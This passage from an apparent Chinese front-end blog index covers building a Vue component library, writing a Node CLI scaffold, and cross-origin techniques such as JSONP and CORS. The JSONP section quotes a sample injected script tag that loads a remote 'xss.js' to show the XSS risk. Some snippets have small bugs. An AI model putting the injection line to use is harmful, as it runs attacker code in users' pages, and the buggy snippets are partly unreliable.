喜欢的给个star吧","link":"/2021/04/11/%E5%8D%87%E7%BA%A7webpack-5%E5%AE%9E%E6%88%98/"},{"title":"如何基于vue开发ui组件库（heaven-ui)","text":"前⾔Vue是⼀套⽤于构建⽤户界⾯的渐进式框架,⽬前有越来越多的开发者在学习和使⽤。⽽组件库能帮我们节省开发精⼒，⽆需所有东⻄都从头开始去做，通过⼀个个⼩组件拼接起来，就得到了我们想要的最终⻚⾯。在⽇常开发中如果没有特定的⼀些业务需求，使⽤组件库进⾏开发⽆疑是更便捷⾼效，⽽且质量也相对更⾼的⽅案。 本⽂阐述了如何基于vue⼀步步完成⼀个UI组件库的打造。 组件库官⽹ github地址 npm地址 ⼀、技术栈我们先简单了解⼀下要搭建⼀个 UI 组件库，会涉及到哪些技术栈，下⾯是我选⽤的内容： vue-cli：官⽅⽀持的 CLI 脚⼿架，提供⼀个零配置的现代构建设置； Vue: 渐进式 JavaScript 库； Jest：JavaScript 测试框架，⽤于组件库的单元测试； ⼆、组件开发项⽬初始化 开始，需要创建⼀个空的vue项⽬，在此基础上我们才能开始接下来的组件库编写！ 1234npm i -g vue-cli // yarn add global vue-clivue init webpack heaven-ui //(heaven-ui)可以随意更换成你的名称cd heaven-uinpm run dev 我们安装完依赖并进⼊项⽬启动服务后vue-cli3会⾃动给我们展示⼀个默认⻚⾯，这⾥我使⽤sass，⽤于美化ui组件的样式。 ⽬录结构 这是我的⽬录结构和解释 123456789101112131415161718|- build/ # webpack打包配置 |- lib/ # 打包生成的文件放这里 |- src/ # 在这里写代码 |- components/ # 各个组件，每个组件是一个子目录 |- mixins/ # 复用的mixin |- utils # 工具目录 |- App.vue # 本地运行的开发预览 |- index.js # 打包入口，组件的导出 |- main.js # 本地运行的运行|- static/ # 存放一些额外的资源文件，图片之类的 |- test/ # 测试文件夹 |- specs/ # 存放所有的测试用例 |- jest.conf.js/ # jest单元测试配置 |- .npmignore |- .gitignore |- .babelrc |- README.md |- package.json 组件库结构 暴露⼀个所有组件的⼊⼝，组件详细代码只展示button部分 src/components/index.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import Alert from './components/alert/index.js'import Button from './components/button/index.js'import ButtonGroup from './components/button-group/index.js'import Checkbox from './components/checkbox/index.js'import CheckboxGroup from './components/checkbox-group/index.js'import DatePicker from './components/date-picker/index.js'import Form from './components/form/index.js'import FormItem from './components/form-item/index.js'import Icon from './components/icon/index.js'import Input from './components/input/index.js'import Option from './components/option/index.js'import Pagination from './components/pagination/index.js'import Radio from './components/radio/index.js'import RadioGroup from './components/radio-group/index.js'import Rate from './components/rate/index.js'import Select from './components/select/index.js'import Switch from './components/switch/index.js'import Table from './components/table/index.js'import HTableColumn from './components/table-column/index.js'import Tag from './components/tag/index.js'const components = [ Button, ButtonGroup, Checkbox, CheckboxGroup, DatePicker, Form, FormItem, Icon, Input, Option, Pagination, Radio, RadioGroup, Rate, Select, Switch, Table, HTableColumn, Tag, ] const install = function(Vue, opts = {}) { components.map(component =&gt; { Vue.component(component.name, component); }) Vue.prototype.$alert = Alert; }/* 支持使用标签的方式引入 */if (typeof window !== 'undefined' &amp;&amp; window.Vue) { install(window.Vue);}export default { install, Alert, Button, ButtonGroup, Checkbox, CheckboxGroup, DatePicker, Form, FormItem, Icon, Input, Option, Pagination, Radio, RadioGroup, Rate, Select, Switch, Table, HTableColumn, Tag,} src/components/button/index.js 1234567import HButton from './src/button';HButton.install = function(Vue) { Vue.component(HButton.name, HButton);};export default HButton; 组件部分⼤概是这样⼦了 打包配置⽬录建好了，那就该填充⾎⾁了，要打包⼀个组件库项⽬，肯定是要先配置好我们的webpack，不然写了源码也没法跑起来。所以我们先定位到 build⽬录下 webpack.base.js 。存放基本的⼀些rules配置 webpack.prod.js 。整个组件库的打包配置 build/webpack.base.conf.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485'use strict'const path = require('path')const utils = require('./utils')const config = require('../config')const vueLoaderConfig = require('./vue-loader.conf')function resolve (dir) { return path.join(__dirname, '..', dir)}module.exports = { context: path.resolve(__dirname, '../'), entry: { app: process.env.NODE_ENV === 'production' ? './src/index.js' : './src/main.js' }, output: { path: config.build.assetsRoot, filename: '[name].js', publicPath: process.env.NODE_ENV === 'production' ? config.build.assetsPublicPath : config.dev.assetsPublicPath }, resolve: { extensions: ['.js', '.vue', '.json'], alias: { 'vue$': 'vue/dist/vue.esm.js', '@': resolve('src'), 'untils': resolve('src/untils'), } }, module: { rules: [ { test: /\\.vue$/, loader: 'vue-loader', options: vueLoaderConfig }, { test: /\\.js$/, loader: 'babel-loader', include: [resolve('src'), resolve('test'), resolve('node_modules/webpack-dev-server/client')] }, { test: /\\.(png|jpe?g|gif|svg)(\\?.*)?$/, loader: 'url-loader', options: { limit: 10000, name: utils.assetsPath('img/[name].[hash:7].[ext]') } }, { test: /\\.(mp4|webm|ogg|mp3|wav|flac|aac)(\\?.*)?$/, loader: 'url-loader', options: { limit: 10000, name: utils.assetsPath('media/[name].[hash:7].[ext]') } }, { test: /\\.(woff2?|eot|ttf|otf)(\\?.*)?$/, loader: 'url-loader', options: { limit: 10000, name: utils.assetsPath('fonts/[name].[hash:7].[ext]') } }, { test: /\\.scss$/, loaders:['style','css','sass'] } ] }, node: { // prevent webpack from injecting useless setImmediate polyfill because Vue // source contains it (although only uses it if it's native). setImmediate: false, // prevent webpack from injecting mocks to Node native modules // that does not make sense for the client dgram: 'empty', fs: 'empty', net: 'empty', tls: 'empty', child_process: 'empty' }} build/webpack.prod.conf.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576'use strict'const path = require('path')const utils = require('./utils')const webpack = require('webpack')const config = require('../config')const merge = require('webpack-merge')const baseWebpackConfig = require('./webpack.base.conf')const ExtractTextPlugin = require('extract-text-webpack-plugin')const OptimizeCSSPlugin = require('optimize-css-assets-webpack-plugin')const UglifyJsPlugin = require('uglifyjs-webpack-plugin')const env = require('../config/prod.env')const webpackConfig = merge(baseWebpackConfig, { module: { rules: utils.styleLoaders({ sourceMap: config.build.productionSourceMap, extract: true, usePostCSS: true }) }, devtool: config.build.productionSourceMap ? config.build.devtool : false, output: { path: config.build.assetsRoot, filename: 'heaven-ui.min.js', library: 'heaven-ui', libraryTarget: 'umd' }, plugins: [ // http://vuejs.github.io/vue-loader/en/workflow/production.html new webpack.DefinePlugin({ 'process.env': env }), new UglifyJsPlugin({ uglifyOptions: { compress: { warnings: false } }, sourceMap: config.build.productionSourceMap, parallel: true }), // extract css into its own file new ExtractTextPlugin({ filename: 'heaven-ui.min.css', }), // Compress extracted CSS. We are using this plugin so that possible // duplicated CSS from different components can be deduped. new OptimizeCSSPlugin() ]})if (config.build.productionGzip) { const CompressionWebpackPlugin = require('compression-webpack-plugin') webpackConfig.plugins.push( new CompressionWebpackPlugin({ asset: '[path].gz[query]', algorithm: 'gzip', test: new RegExp( '\\\\.(' + config.build.productionGzipExtensions.join('|') + ')$' ), threshold: 10240, minRatio: 0.8 }) )}if (config.build.bundleAnalyzerReport) { const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin webpackConfig.plugins.push(new BundleAnalyzerPlugin())}module.exports = webpackConfig 这⾥我配置的输出⽬录为lib，打包后的结果如下图： 三、单元测试单元测试包含以下优点： \\1. 可能会测出功能的隐藏bug \\2. 保证代码重构的安全性。 组件库中每⼀个组件都可能会重构或者更新迭代，如果单元测试覆盖率⾼的话，修改代码之后就越可能会发现潜在的问题。⽐如版本升级后，导致某部分功能的缺失。 组件库开发调试完成后，我们需要编写每个组件对应的单元测试，以达到100%的覆盖率为⽬标。 以button为例： test/specs/Button.spec.js 12345678import Vue from 'vue'import Button from '@/components/button'describe('button.vue', () =&gt; { it('button是否存在',()=&gt;{ expect(Button).to.be.ok; })}) 这⾥我配置的输出⽬录为lib 四、发布NPM发布npm之前，我们必须按照npm的发包规则来编写我们的package.json, 我们先来解决组件库打包的问题,⾸先我们需要让脚⼿架编译我们的组件代码,并输出到指定⽬录下,我们按照发包规范⼀般会输出到lib⽬录下。项⽬打包完成后，我们需要编写package⽂件的description,keywords等,具体介绍如下: description 组件库的描述⽂本 keywords 组件库的关键词 license 许可协议 repository 组件库关联的git仓库地址 homepage 组件库展示的⾸⻚地址 main 组件库的主⼊⼝地址(在使⽤组件时引⼊的地址) private 声明组件库的私有性,如果要发布到npm公⽹上,需删除该属性或者设置为false publishConfig ⽤来设置npm发布的地址,这个配置作为团队内部的npm服务器来说⾮常关键,可以设置为私有的npm仓库 发布到npm的⽅法也很简单, ⾸先我们需要先注册去npm官⽹注册⼀个账号, 然后控制台登录即可,最后我们执⾏npm publish即 可.具体流程如下: 123456// 登录npm login// 发布npm publish// 如果发布失败提示权限问题,请执行以下命令npm publish --access public 注意：本次publish 版本号都需要修改版本号 五、总结我们可以⽤vue-cli 或其他⼯具另外⽣成⼀个demo项⽬，⽤这个项⽬去引⼊我们的组件库。如果你的包还没有发布出去，可以在你的 组件库项⽬⽬录下 ⽤ npm link 或者 yarn link的命令创建⼀个link 然后在你的demo⽬录下使⽤ npm link package_name 或者 yarn link package_name 这⾥的package_name就是你的组件库的 包名，然后在你的demo项⽬的⼊⼝⽂件⾥ 123456import Vue from vueimport Heaven from 'heaven-ui'import 'heaven-ui/dist/heaven-ui.min.css'// 其他代码 ...Vue.use(Heaven) 这样设置好之后，我们创建的组件就可以在这个项⽬⾥使⽤了","link":"/2021/05/22/%E5%A6%82%E4%BD%95%E5%9F%BA%E4%BA%8Evue%E5%BC%80%E5%8F%91ui%E7%BB%84%E4%BB%B6%E5%BA%93%EF%BC%88heaven-ui/"},{"title":"如何搭建一个自己的脚手架","text":"脚手架 搭建脚手架的目的就是快速的搭建项目的基本结构并提供项目规范和约定。目前日常工作中常用的脚手架有 vue-cli、create-react-app、angular-cli 等等，都是通过简单的初始化命令，完成内容的快速构建。 其实我们也可以用git clone url来新建（复制）项目，再 low 一点的方法就是复制粘贴整个文件夹，一样也能达到初始化的目的。 脚手架的本质也是从远程下载一个模板来进行一个新项目，但是脚手架可是高级版的克隆，它主要是提供了交互式的命令让我们可以动态的更改模板，然后用一句命令就可以实现其他内置依赖的初始化,方便了多人协作，不需要将文件传来传去。 接下来我们就开始实现一个简易版的脚手架heaven-cli（可自行命名），目标是实现一个heaven init template-name project-name这样的命令，废话少说，开始进入正题吧！ 前置知识了解 其实一个简易版的 heaven-cli的代码量并不多，所以这里我们先来介绍一下其中要使用到的第三方库 commander 这是用来编写指令和处理命令行的，用法如下： 1234567891011const program = require(&quot;commander&quot;);// 定义指令program .version('0.0.1') .command('init', 'Generate a new project from a template') .action(() =&gt; { // 回调函数 })// 解析命令行参数program.parse(process.argv);复制代码 inquirer 这是个强大的交互式命令行工具，用法如下： 123456789const inquirer = require('inquirer');inquirer .prompt([ // 一些交互式的问题 ]) .then(answers =&gt; { // 回调函数，answers 就是用户输入的内容，是个对象 });复制代码 chalk 这是用来修改控制台输出内容样式的，起到了美化输出内容的作用，用法如下： 1234const chalk = require('chalk');console.log(chalk.green('success'));console.log(chalk.red('error'));复制代码 ora 这是一个好看的加载交互组件，用于下载过程中的loading效果，用法如下： 1234const ora = require('ora')let spinner = ora('downloading template ...')spinner.start()复制代码 download-git-repo 用于下载远程模板的，支持 GitHub、 GitLab 和 Bitbucket 等，用法如下： 123const download = require('download-git-repo')download(repository, destination, options, callback)复制代码 其中 repository 是远程仓库地址；destination 是存放下载的文件路径，也可以直接写文件名，默认就是当前目录；options 是一些选项，比如{ clone：boolean }表示用 http download 还是 git clone 的形式下载。 初始化目录 首先我们先创建一个空文件夹，取名 heaven-cli； 目录结构 12345678910├── bin //可执行文件└── lib ├── init.js //init command ├── template └── index.js //内置的所有模版 └── utils └── utils.js // 公共方法├── package.json├── README.md复制代码 在该目录下执行npm init命令，进行初始化。 安装依赖 12npm install chalk commander inquirer ora download-git-repo复制代码 我这边的package.json的依赖是这样的 12345678&quot;dependencies&quot;: { &quot;chalk&quot;: &quot;^4.1.2&quot;, &quot;commander&quot;: &quot;^8.3.0&quot;, &quot;download-git-repo&quot;: &quot;^3.0.2&quot;, &quot;inquirer&quot;: &quot;^8.1.2&quot;, &quot;ora&quot;: &quot;^5.4.1&quot;}复制代码 node.js 内置了对命令行操作的支持，package.json 中的 bin 字段可以定义命令名和关联的执行文件。在 package.json 中添加 bin 字段 1234&quot;bin&quot;: { &quot;heaven&quot;: &quot;bin/heaven.js&quot; },复制代码 bin 目录下新建一个heaven.js，并在行首加入一行 #!/usr/bin/env node 指定当前脚本由node.js进行解析 123456789101112131415#!/usr/bin/env nodeconst program = require('commander')const init = require(&quot;../lib/init&quot;);program .command('init &lt;template&gt; &lt;app-name&gt;') .description('generate a project from a remote template (legacy API, requires @heaven-cli)') .action((template, name) =&gt; { init(template, name) }) // 解析命令行参数program.parse(process.argv)复制代码 这个文件的主要作用就是定义指令，我们用node ./bin/heaven运行一下，就能看到运行结果了， 当然，在开发过程中为了方便调试，在当前的 heaven-cli 目录下执行 npm link，将 heaven 命令链接到全局环境， 这样我们每次只要输入heaven，就可以直接运行了。 后面就可以编写 /lib/init.js的代码了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// 交互式命令行const inquirer = require('inquirer')// 修改控制台字符串的样式const chalk = require('chalk')// node 内置文件模块const fs = require('fs')// 读取template下内置的模版const tplObj = require(&quot;./template&quot;)// 下载const download = require(&quot;download-git-repo&quot;);// 自定义交互式命令行的问题及简单的校验let question = [ { name: &quot;name&quot;, type: 'input', message: &quot;Project name (&quot; + name + ')', validate (val) { if (val === '') { return 'Name is required!' } else { return true } } }, { name: &quot;description&quot;, type: 'input', message: &quot;Project description&quot; },]inquirer .prompt(question).then(answers =&gt; { // answers 就是用户输入的内容，是个对象 let { description } = answers; let projectName = answers.name // 出现加载图标 const spinner = ora(&quot;Downloading...&quot;); const url = tplObj.template[template] // 执行下载方法并传入参数 download( url, projectName, err =&gt; { if (err) { spinner.fail(); console.log(chalk.red(`Generation failed. ${err}`)) return } // 将用户输入的内容，写入package.json内 const packageFile = path.join(process.cwd(), projectName + '/package.json'); const package = require(packageFile); package.description = description; package.name = projectName; fs.writeFileSync(file, `module.exports = ${JSON.stringify(package, null, '\\t')};`, 'utf8'); // 结束加载图标 spinner.succeed(); console.log(chalk.green('\\n Generation completed!')) console.log('\\n To get started') console.log(`\\n cd ${projectName} \\n`) } ) })复制代码 至此，一个小小的脚手架就做完了。 接下来就测试一下heaven init vue my-project命令能否生效 很快就可以看到已经成功初始化了my-project，此时可以看一下my-project文件夹下面 发布到 npm 既然以上命令可以执行成功了，那接下来我们就把它发布到 npm 上吧，其它用户就可以通过 npm install heaven-cli-fe -g 全局安装。 即可使用 heaven 命令。 源码地址：github.com/hujinbin/he… 可使用 template 包含如下 vue vue-seo koa-react koa-vue microservice vue vue-cli，webpack5.28版本 vue-seo （开发中） 基于vue-cli搭建的伪ssr脚手架，webpack5.28版本，打包生成对应的静态html，并跳转到真实网址，用于seo搜索。 koa-react koa+react 工程项目骨架，ssr模式，支持mysql和mongodb数据库 koa-vue koa+vue 工程项目骨架 mvc结构， 前端vue单页面应用 microservice （开发中） 基于vite搭建微前端脚手架","link":"/2022/02/05/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6/"},{"title":"实用的跨域方法","text":"同源策略同源策略/SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSRF 等攻击。所谓同源是指 “协议 + 域名 + 端口” 三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。 什么是跨域？当协议、域名、端口号，有一个或多个不同时，有希望可以访问并获取数据的现象称为跨域访问，同源策略限制下 cookie、localStorage、dom、ajax、IndexDB 都是不支持跨域的。 假设 cookie 支持了跨域，http 协议无状态，当用户访问了一个银行网站登录后，银行网站的服务器给返回了一个 sessionId，当通过当前浏览器再访问一个恶意网站，如果 cookie 支持跨域，恶意网站将获取 sessionId 并访问银行网站，出现安全性问题；IndexDB、localStorage 等数据存储在不同域的页面切换时是获取不到的；假设 dom 元素可以跨域，在自己的页面写入一个 iframe 内部嵌入的地址是 www.baidu.com， 当在百度页面登录账号密码时就可以在自己的页面获取百度的数据信息，这显然是不合理的。 这就是为什么 cookie、localStorage、dom、ajax、IndexDB 会受到同源策略会限制，下面还有一点对跨域理解的误区： 误区：同源策略限制下，访问不到后台服务器的数据，或访问到后台服务器的数据后没有返回； 正确：同源策略限制下，可以访问到后台服务器的数据，后台服务器会正常返回数据，而被浏览器给拦截了。 实现跨域的方式 一、使用 jsonp 跨域使用场景：当自己的项目前端资源和后端部署在不同的服务器地址上，或者其他的公司需要访问自己对外公开的接口，需要实现跨域获取数据，如百度搜索。 123456789101112131415161718192021222324252627282930313233// 封装 jsonp 跨域请求的方法function jsonp({ url, params, cb }) { return new Promise((resolve, reject) =&gt; { // 创建一个 script 标签帮助我们发送请求 let script = document.createElement(&quot;script&quot;); let arr = []; params = { ...params, cb }; // 循环构建键值对形式的参数 for (let key in params) { arr.push(`${key}=${params[key]}`); } // 创建全局函数 window[cb] = function(data) { resolve(data); // 在跨域拿到数据以后将 script 标签销毁 document.body.removeChild(script); }; // 拼接发送请求的参数并赋值到 src 属性 script.src = `${url}?${arr.join(&quot;&amp;&quot;)}`; document.body.appendChild(script); });}// 调用方法跨域请求百度搜索的接口json({ url: &quot;https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su&quot;, params: { wd: &quot;jsonp&quot; }, cb: &quot;show&quot;}).then(data =&gt; { // 打印请求回的数据 console.log(data);}); 缺点： 只能发送 get 请求 不支持 post、put、delete；不安全，容易引发 xss 攻击，别人在返回的结果中返回了下面代码。 123let script = document.createElement('script');script.src = &quot;http://192.168.0.57:8080/xss.js&quot;;document.body.appendChild(script);`; 会把别人的脚本引入到自己的页面中执行，如：弹窗、广告等，甚至更危险的脚本程序。 二、使用 CORS 跨域跨源资源共享/CORS（Cross-Origin Resource Sharing）是 W3C 的一个工作草案，定义了在必须访问跨源资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。 使用场景：多用于开发时，前端与后台在不同的 ip 地址下进行数据访问。 现在启动两个端口号不同的服务器，创建跨域条件，服务器（NodeJS）代码如下： 12345678910111213// 服务器1const express = require(express);let app = express();app.use(express.static(__dirname));app.listen(3000);// 服务器2const express = require(&quot;express&quot;);let app = express();app.get(&quot;/getDate&quot;, function(req, res) { res.end(&quot;I love you&quot;);});app.use(express.static(__dirname));app.listen(4000); 由于我们的 NodeJS 服务器使用 express 框架，在我们的项目根目录下的命令行中输入下面代码进行安装： npm install express –save 通过访问 http://localhost:3000/index.html 获取 index.html 文件并执行其中的 Ajax 请求 http://localhost:4000/getDate 接口去获取数据，index.html 文件内容如下： 1234567891011121314151617181920212223242526272829303132&lt;!-- 文件：index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CORS 跨域&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; let xhr = new XMLHttpRequest(); // 正常 cookie 是不允许跨域的 document.cookie = 'name=hello'; // cookie 想要实现跨域必须携带凭证 xhr.withCredentials = true; // xhr.open('GET', 'http://localhost:4000/getDate', true); xhr.open('PUT', 'http://localhost:4000/getDate', true); // 设置名为 name 的自定义请求头 xhr.setRequestHeader('name', 'hello'); xhr.onreadystatechange = function () { if(xhr.readyState === 4) { if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status === 304) { // 打印返回的数据 console.log(xhr.response); // 打印后台设置的自定义头信息 console.log(xhr.getResponseHeader('name')); } } } xhr.send(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 上面 index.html 代码中发送请求访问不在同源的服务器 2，此时会在控制台给出错误信息，告诉我们缺少了哪些响应头，我们对应报错信息去修改访问的服务器 2 的代码，添加对应的响应头，实现 CORS 跨域。 123456789101112131415161718192021222324252627282930313233343536// 服务器2const express = require(&quot;express&quot;);let app = express();// 允许访问域的白名单let whiteList = [&quot;http://localhost:3000&quot;];app.use(function(req, res, next) { let origin = req.header.origin; if (whiteList.includes(origin)) { // 设置那个源可以访问我，参数为 * 时，允许任何人访问，但是不可以和 cookie 凭证的响应头共同使用 res.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // 想要获取 ajax 的头信息，需设置响应头 res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;name&quot;); // 处理复杂请求的头 res.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;PUT&quot;); // 允许发送 cookie 凭证的响应头 res.setHeader(&quot;Access-Control-Allow-Credentials&quot;, true); // 允许前端获取哪个头信息 res.setHeader(&quot;Access-Control-Expose-Headers&quot;, &quot;name&quot;); // 处理 OPTIONS 预检的存活时间，单位 s res.setHeader(&quot;Access-Control-Max-Age&quot;, 5); // 发送 PUT 请求会做一个试探性的请求 OPTIONS，其实是请求了两次，当接收的请求为 OPTIONS 时不做任何处理 if (req.method === &quot;OPTIONS&quot;) { res.end(); } } next();});app.put(&quot;/getDate&quot;, function(req, res) { // res.setHeader('name', 'nihao'); // 设置自定义响应头信息 res.end(&quot;I love you&quot;);});app.get(&quot;/getDate&quot;, function(req, res) { res.end(&quot;I love you&quot;);});app.use(express.static(__dirname));app.listen(4000); 三、使用 postMessage 实现跨域postMessage 是 H5 的新 API，跨文档消息传送（cross-document messaging），有时候简称为 XMD，指的是在来自不同域的页面间传递消息。 调用方式：window.postMessage(message, targetOrigin) message：发送的数据targetOrigin：发送的窗口的域在对应的页面中用 message 事件接收，事件对象中有 data、origin、source 三个重要信息 data：接收到的数据origin：接收到数据源的域（数据来自哪个域）source：接收到数据源的窗口对象（数据来自哪个窗口对象）使用场景：不是使用 Ajax 的数据通信，更多是在两个页面之间的通信，在 A 页面中引入 B 页面，在 A、B 两个页面之间通信。 与上面 CORS 类似，我们要创建跨域场景，搭建两个端口号不同的 Nodejs 服务器，后面相同方式就不多赘述了。 12345678910// 服务器1const express = require(express);let app = express();app.use(express.static(__dirname));app.listen(3000);// 服务器2const express = require(express);let app = express();app.use(express.static(__dirname));app.listen(4000); 通过访问 http://localhost:3000/a.html，在 a.html 中使用 iframe 标签引入 http://localhost:4000/b.html，在两个窗口间传递数据。 1234567891011121314151617181920212223242526272829303132333435363738&lt;!-- 文件：a.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 A&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;iframe src=&quot;http://localhost:4000/b.html&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;&lt;/iframe&gt; &lt;script&gt; function load() { let frame = document.getElementById('frame'); frame.contentWindow.postMessage('I love you', 'http://localhost:4000'); window.onmessage = function (e) { console.log(e.data); } } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- 文件：b.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 B&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; window.onmessage = function (e) { // 打印来自页面 A 的消息 console.log(e.data); // 给页面 A 发送回执 e.source.postMessage('I love you, too', e.origin); } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 四、使用 window.name 实现跨域同样是页面之间的通信，需要借助 iframe 标签，A 页面和 B 页面是同域的 http://localhost:3000，C 页面在独立的域 http://localhost:4000。 12345678910// 服务器1const express = require(express);let app = express();app.use(express.static(__dirname));app.listen(3000);// 服务器2const express = require(express);let app = express();app.use(express.static(__dirname));app.listen(4000); 实现思路：在 A 页面中将 iframe 的 src 指向 C 页面，在 C 页面中将属性值存入 window.name 中，再把 iframe 的 src 换成同域的 B 页面，在当前的 iframe 的 window 对象中取出 name 的值，访问 http://localhost:3000/a.html。 12345678910111213141516171819202122232425262728293031323334353637&lt;!-- 文件：a.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 A&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;iframe src=&quot;http://localhost:4000/c.html&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;&lt;/iframe&gt; &lt;script&gt; // 增加一个标识，第一次触发 load 时更改地址，更改后再次触发直接取值 let isFirst = true; function load() { let frame = document.getElementById('frame'); if(isFirst) { frame.src = 'http://localhost:3000/b.html'; isFirst = false; } else { console.log(frame.contentWindow.name); } } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- 文件：c.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 C&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; window.name = 'I love you'; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 五、使用 location.hash 实现跨域与 window.name 跨域的情况相同，是不同域的页面间的参数传递，需要借助 iframe 标签，A 页面和 B 页面是同域的 http://localhost:3000，C 页面是独立的域 http://localhost:4000。 12345678910// 服务器1const express = require(express);let app = express();app.use(express.static(__dirname));app.listen(3000);// 服务器2const express = require(express);let app = express();app.use(express.static(__dirname));app.listen(4000); 实现思路：A 页面通过 iframe 引入 C 页面，并给 C 页面传一个 hash 值，C 页面收到 hash 值后创建 iframe 引入 B 页面，把 hash 值传给 B 页面，B 页面将自己的 hash 值放在 A 页面的 hash 值中，访问 http://localhost:3000/a.html。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!-- 文件：a.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 A&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;iframe src=&quot;http://localhost:4000/c.html#Iloveyou&quot; id=&quot;frame&quot;&gt;&lt;/iframe&gt; &lt;script&gt; // 使用 hashchange 事件接收来自 B 页面设置给 A 页面的 hash 值 window.onhashchange = function () { console.log(location.hash); } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- 文件：c.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 C&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 打印 A 页面引入 C 页面设置的 hash 值 console.log(location.hash); let iframe = document.createElement('iframe'); iframe.src = 'http://localhost:3000/b.html#Iloveyoutoo'; document.body.appendChild(iframe); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- 文件：b.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 B&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 将 C 页面引入 B 页面设置的 hash 值设置给 A页面 window.parent.parent.location.hash = location.hash; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 六、使用 document.domain 实现跨域使用场景：不是万能的跨域方式，大多使用于同一公司不同产品间获取数据，必须是一级域名和二级域名的关系，如 www.baidu.com 与 video.baidu.com 之间。 1234const express = require(&quot;express&quot;);let app = express();app.use(express.static(__dirname));app.listen(3000); 想要模拟使用 document.domain 跨域的场景需要做些小小的准备，到 C:Windows/System32/drivers/etc 该路径下找到 hosts 文件，在最下面创建一个一级域名和一个二级域名。 127.0.0.1 www.leheavengame.com 127.0.0.1 m.leheavengame.com 命名是随意的，只要是符合一级域名与 二级域名的关系即可，然后访问 http://www.leheavengame.com:3000/a.html。 1234567891011121314151617181920212223242526272829303132333435&lt;!-- 文件：a.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;页面 A&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;我是页面 A 的内容&lt;/p&gt; &lt;iframe src=&quot;http://sucess.leheavengame.com:3000/b.html&quot; onload=&quot;load()&quot; id=&quot;frame&quot;&gt;&lt;/iframe&gt; &lt;script&gt; document.domain = 'leheavengame.com'; function load() { console.log(frame.contentWindow.message); } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- 文件：b.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;页面 B&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;我是 B 页面的内容&lt;/p&gt; &lt;script&gt; document.domain = 'leheavengame.com'; var message = 'Hello A'; 